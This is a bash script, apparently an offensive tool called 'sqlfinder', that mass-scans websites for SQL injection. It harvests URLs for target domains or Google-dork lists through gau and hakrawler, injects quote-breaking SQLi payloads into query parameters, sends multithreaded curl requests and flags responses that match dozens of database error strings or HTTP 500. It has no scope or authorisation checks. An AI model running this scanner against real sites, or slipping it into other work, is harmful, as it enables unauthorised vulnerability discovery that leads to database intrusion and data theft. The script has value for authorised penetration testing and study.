#!/bin/bash

# pip3 install uro

# errors of diffirent db:
# MySql: You have an error in your SQL syntax
# mysql
# Oracle: SQL command not properly ended
# MS SQL Server: Microsoft SQL Native Client error
# PostgreSQL: Query failed: ERROR: syntax error at or near
######
# mysql_fetch_array()
# mysql_num_rows()
# Error Occurred While Processing request
# Server Error in'/'Application
# Microsoft OLE DB Provider for ODBC Drivers error
# error in your SQL syntax
# VBScript Runtime
# ADODB.Field
# BOF or EOF
# ADODB.command
# JET Database
# Syntax error
# mysql_fetch_row()
# include()
# mysql_fetch_assoc()
# mysql_fetch_object()
# mysql_numrows()
# GetArray()
# FetchRow()
# Input string was not in a correct format
# Microsoft VBScript;
# Invalid Querystring
# OLE DB Provider for ODBC

## payload
# '123
# ''123
# `123
# ")123
# "))123
# `)123
# `))123
# '))123
# ')123"123
# []123
# ""123
# '"123
# "'123
# \123
payloads=("'123" "%22" "''123" "\`123" "\")123" "\"))123" "\`)123" "\`))123" "'))123" "')123\"123" "[]123" "\"\"123" "'\"123" "\"'123" "\\123")
echo -e "\x1b[1;31mmade by Aimed Guendouz\x1b[1;0m"

#default value
trap ctrl_c INT
threads_limit=20
timeout=0
focus=0
mkdir $HOME/.sqlfinder 2>/dev/null
output="$HOME/.sqlfinder/sqli_$(date +"%F-%T")"
function ctrl_c() {
    echo -e "\n vulnerable urls were saved to: $output"
    exit
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -o|--output)
            output="$2"
            shift 2
            ;;
        --focus)
            focus=1
            shift 1
            ;;
        --timeout)
            timeout="$2"
            shift 2
            ;;
        -u)
            urls="$2"
            threads_limit=1
            shift 2
            ;;
        --urls)
            urls_file=$2
            urls=$(cat "$urls_file" | uro | gf sqli)
            shift 2
            ;;
        -f|--targets-file)
            # Handle the option with an argument
            urls_file="$2"
            domains_urls=$(cat "$urls_file" | sed 's|^|http://|' )
            domains_urls+="\n$(cat "$urls_file" | sed 's|^|https://|' )"
            if [ $focus -eq 0 ];then
                hakrawler_urls=$(echo -e "$domains_urls" | hakrawler | gf sqli)
                gau_urls=$(cat "$urls_file" | gau --blacklist ttf,woff,svg,png --threads 25 --providers wayback,commoncrawl,otx,urlscan | gf sqli)
            else
                hakrawler_urls=$(echo -e "$domains_urls" | hakrawler)
                gau_urls=$(cat "$urls_file" | gau --blacklist ttf,woff,svg,png --threads 25 --providers wayback,commoncrawl,otx,urlscan)
            fi
            urls=$(echo -e "$gau_urls\n$hakrawler_urls" | sed 's/:80//' | sort -u | uro)
            echo "got " $(echo "$gau_urls" | wc -l) " urls from gau"
            echo "got " $(echo "$hakrawler_urls" | wc -l) " urls from hakrawler"
            echo "scanning multiple domains in file: $urls_file"
            shift 2
            ;;
        -k|--dorking)
            # Handle the option without an argument (a flag)
            urls_file="$2"
            cat "$urls_file" | grep -v google | awk -F/ '!seen[$3]++' | grep -oP '^[^&]+' | grep \? | sort -u > tmp;mv tmp "$urls_file"
            urls=$(cat "$urls_file")
            echo "scanning one url per domain in file: $urls_file"
            shift 2
            ;;
        -d|--domain)
            domain="$2"
            domains_urls="https://${domain}
http://${domain}"
            if [ $focus -eq 0 ];then
                gau_urls=$(echo "$domain" | gau --blacklist ttf,woff,svg,png --threads 25 --providers wayback,commoncrawl,otx,urlscan | uro)
                hakrawler_urls=$(echo -e "$domains_urls" | hakrawler -d 6 | uro)
            else
                gau_urls=$(echo "$domain" | gau --blacklist ttf,woff,svg,png --threads 25 --providers wayback,commoncrawl,otx,urlscan | uro)
                hakrawler_urls=$(echo -e "$domains_urls" | hakrawler -d 6 | uro)
            fi
            echo "got " $(echo "$gau_urls" | wc -l) " urls from gau"
            echo "domain_urls $domains_urls"
            echo "got " $(echo "$hakrawler_urls" | wc -l) " urls from hakrawler"
            urls=$(echo -e "$gau_urls\n$hakrawler_urls" | gf sqli | uro)
            echo "scanning a single domain: $domain"
            shift 2
            ;;
        -t|--threads)
            threads_limit=$2
            shift 2
            ;;
        -h|--help)
            echo "help page:"
            echo "--timeout timeout for each connection"
            echo "-u one url to scan"
            echo "--urls file contain urls to test on"
            echo "-f|--targets-file file contain targets domain"
            echo "-k|--dorking scan one url per domain in the given file"
            echo "-d|--domain scan a single domain"
            echo "-t|--threads"
            exit 1
            ;;
        *)
            # Handle positional arguments or unknown options
            echo "Unknown option or argument: $1"
            exit 1
            ;;
    esac
done

echo "threads number: $threads_limit"
total_urls=$(echo "$urls" | wc -l)
echo "payloads number: ${#payloads[@]}"
echo -e "urls number:$total_urls\n"
urls=$(echo "$urls" | sed "s/&/\'&/g")
echo "$urls" > urls


checkurl() {
    local url=$1
    urlpayloaded=$(echo $url | qsreplace $payload)
    local response=$(curl --connect-timeout "$timeout" -L -k -s -o /dev/stdout -w "%{http_code}" $urlpayloaded)
    status_code=$(tail -n1 <<< "$response")
    out=$(sed '$d' <<< "$response")
    if echo "$status_code" | grep -q "500"; then
        echo -e "\r\x1b[1;31m☠️ SQLi detected! 80%==> $url \x1b[1;32m-- 500 http status\x1b[1;0m"
        echo "$url | 500 http status | 99%" >> "$output"
    fi
    local curl_exit_code=$?

    if [ $curl_exit_code -eq 28 ]; then
        # Exit code 28 indicates a timeout error
        echo "⚠️ Timeout error: The request took too long to complete."
        echo "$url$payload" >> "timeout"
    elif [ $curl_exit_code -ne 0 ]; then
        #  Handle other non-zero exit codes as needed
        echo "⚠️ Curl error: $curl_exit_code on url $url"
    fi

    # check for vulnerable 99%
    if echo "$out" | grep -qiE "(You have an error in your SQL syntax|SQL command not properly ended|Microsoft SQL Native Client error|Query failed: ERROR: syntax error at or near|mysql_fetch_array()|mysql_num_rows()|Error Occurred While Processing request|Server Error in '/Application'|Microsoft OLE DB Provider for ODBC Drivers error|error in your SQL syntax|VBScript Runtime|ADODB\.Field|BOF or EOF|ADODB\.command|JET Database|mysql_fetch_row()|mysql_fetch_assoc()|mysql_fetch_object()|mysql_numrows()|Microsoft VBScript;|Invalid Querystring|OLE DB Provider for ODBC|Unknown column|Unknown table|Table .* doesn't exist|Column .* in table .* is ambiguous|Unterminated string at line|Data truncated for column .* at row|Unclosed quotation mark|Incorrect syntax near|Could not find stored procedure|Invalid column name|Invalid object name|Subquery returned more than 1 value|Divide by zero error|ORA-01756|ORA-00933|ORA-00904|ORA-01722|ORA-01789|ORA-01403|ORA-01400|ORA-00921|ORA-00942|ERROR: column|ERROR: relation|ERROR: column .* does not exist|ERROR: relation .* does not exist|ERROR: syntax error at or near .*|ERROR: current transaction is aborted|ERROR: operator does not exist|ERROR: function .*(.*) does not exist|ERROR: value too long for type character)"; then
        error=$(echo "$out" | grep -ioE "(You have an error in your SQL syntax|SQL command not properly ended|Microsoft SQL Native Client error|Query failed: ERROR: syntax error at or near|mysql_fetch_array()|mysql_num_rows()|Error Occurred While Processing request|Server Error in '/Application'|Microsoft OLE DB Provider for ODBC Drivers error|error in your SQL syntax|VBScript Runtime|ADODB\.Field|BOF or EOF|ADODB\.command|JET Database|mysql_fetch_row()|mysql_fetch_assoc()|mysql_fetch_object()|mysql_numrows()|Microsoft VBScript;|Invalid Querystring|OLE DB Provider for ODBC|Unknown column|Unknown table|Table .* doesn't exist|Column .* in table .* is ambiguous|Unterminated string at line|Data truncated for column .* at row|Unclosed quotation mark|Incorrect syntax near|Could not find stored procedure|Invalid column name|Invalid object name|Subquery returned more than 1 value|Divide by zero error|ORA-01756|ORA-00933|ORA-00904|ORA-01722|ORA-01789|ORA-01403|ORA-01400|ORA-00921|ORA-00942|ERROR: column|ERROR: relation|ERROR: column .* does not exist|ERROR: relation .* does not exist|ERROR: syntax error at or near .*|ERROR: current transaction is aborted|ERROR: operator does not exist|ERROR: function .*(.*) does not exist|ERROR: value too long for type character)" | head -n1)
        echo -e "\r\x1b[1;31m☠️ SQLi detected! 99%==> $url \x1b[1;32m-- $error\x1b[1;0m"
        echo -en "waiting for ... $((score*threads_limit))\r"
        echo "$url | $error | 99%" >> "$output"
    elif echo "$out" | grep -qiE "(Syntax error|uncaught error|Fatal error|GetArray()|Input string was not in a correct format)";then
        error=$(echo "$out" | grep -ioE "(Syntax error|uncaught error|Fatal error|GetArray()|Input string was not in a correct format)" | head -n1)
        echo -e "\r\x1b[1;31m☠️ SQLi detected! 50%==> $url \x1b[1;32m-- $error\x1b[1;0m"
        echo -en "waiting for ... $((score*threads_limit))\r"
        echo "$url | $error | 50%" >> "$output"
    fi
   
}

for pl in "${payloads[@]}";do
    score=0
    payload="$pl"
    echo -e "\e[1;35m⚙️ using payload --> $payload\e[0m"
    current_threads=0

    while IFS= read -r url; do
        ((current_threads++))
        ((scanned++))
        checkurl "$url" &
        if [ $current_threads -eq $threads_limit ]; then 
            ((score++))
            echo -en "waiting for ... $((score*threads_limit))\r"
            wait
            echo -en "\r"
            current_threads=0
        fi
    done <<< "$urls"
    wait
done

echo -e "\nvulnerable urls were saved to: $output"